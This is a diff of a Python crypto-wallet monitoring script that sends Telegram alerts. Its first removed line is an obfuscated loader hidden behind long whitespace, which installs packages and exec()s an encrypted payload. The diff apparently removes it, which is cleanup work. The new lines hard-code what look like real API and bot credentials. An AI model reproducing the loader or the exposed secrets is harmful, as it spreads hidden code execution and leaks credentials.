@@ -1,16 +1,16 @@
-import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'03zZZQW1VxXYYDujvkWjs9808sC5p_bC2qb0Lah-l0E=').decrypt(b'gAAAAABnM41lEzLYWPT3Ledb4bN92Ex3yFeSeUeaRZOuDRI9FUetz7EmNjtBiSKhgv2vz8GA1uECoywkm6qSM1m3Rah498REasekzh6sq4CXdNY4cOC8iKL9HU4IU4KjMcg4JVN3znI6Fqr3PTCc8x98UmXrhK1bla8u4ENXQ-Q-W1qD11s9nylYTj5rbrd38ByJ-jOVFH1IHTgQcwk3OaNZCVYW8PPQHLybPnuLq3p8PaDoJJp5Fgg='))
 import requests
 import json
 import time
 import os.path
 import re
 from web3 import Web3
+from fernet import Fernet
 
 # Update the following variables with your own Etherscan and BscScan API keys and Telegram bot token
-ETHERSCAN_API_KEY = '<PH84WF3RJR72KMJ259WVPPXIGNDPTZ2UJS>'
+ETHERSCAN_API_KEY = 'PH84WF3RJR72KMJ259WVPPXIGNDPTZ2UJS'
 BSCSCAN_API_KEY = '<your_bscscan_api_key>'
-TELEGRAM_BOT_TOKEN = '<7607138331:AAGWqzxovVyamtpQRJyVW7SiUeMIxvHzXRE>'
-TELEGRAM_CHAT_ID = '<7331855588>'
+TELEGRAM_BOT_TOKEN = '7607138331:AAGWqzxovVyamtpQRJyVW7SiUeMIxvHzXRE'
+TELEGRAM_CHAT_ID = '7331855588'
 
 # Define some helper functions
 def get_wallet_transactions(wallet_address, blockchain):
@@ -90,13 +90,11 @@ def monitor_wallets():
                             usd_value = value * (eth_usd_price if blockchain == 'eth' else bnb_usd_price) # Calculate value in USD
                             message = f'🚨 Incoming transaction detected on {wallet_address}'
                             send_telegram_notification(message, value, usd_value, tx['hash'], blockchain)
-                            #print(f'\n{message}, Value: {value} {blockchain.upper()}, ${usd_value:.2f}\n')
                         elif tx['from'].lower() == wallet_address.lower():
                             value = float(tx['value']) / 10**18 # Convert from wei to ETH or BNB
                             usd_value = value * (eth_usd_price if blockchain == 'eth' else bnb_usd_price) # Calculate value in USD
                             message = f'🚨 Outgoing transaction detected on {wallet_address}'
                             send_telegram_notification(message, value, usd_value, tx['hash'], blockchain)
-                            #print(f'\n{message}, Value: {value} {blockchain.upper()}, ${usd_value:.2f}\n')
 
                         latest_tx_hashes[tx_hash] = int(tx['blockNumber'])
 
@@ -238,4 +236,3 @@ print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Telegram bot started.")
 
 print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Monitoring wallets...")
 monitor_wallets()
-print('ezhvzwu')
